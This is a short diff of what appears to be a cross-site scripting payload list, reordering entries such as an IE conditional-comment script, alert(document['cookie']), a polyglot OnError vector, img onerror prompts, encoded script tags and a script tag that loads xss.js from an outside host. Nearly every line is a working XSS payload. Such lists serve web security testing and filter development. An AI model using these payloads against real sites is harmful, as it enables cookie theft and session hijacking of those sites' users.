@@ -1,6 +1,3 @@
-<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
-alert(document['cookie'])
-<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
 "><img src=x&#9;onerror=prompt(document.domain);>
 <script src="#">{alert(101101)}</script>;1
 &#x3C;script&#x3E;alert(1)&#x3C;&#x2F;script&#x3E;
@@ -12,6 +9,9 @@ alert(document['cookie'])
 <SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 <frameset onFocus frameset onFocus="javascript:javascript:alert(101101)"></frameset onFocus>
 <a href=&#01javascript:alert(1)>
+<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
+alert(document['cookie'])
+<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
 &lt;IMG SRC=javascript&#058;alert('101101')&gt;
 <img language=vbs src=<b onerror=confirm#1/1#>
 <img/src=x onError="`${x}`;alert(`Hello`);">
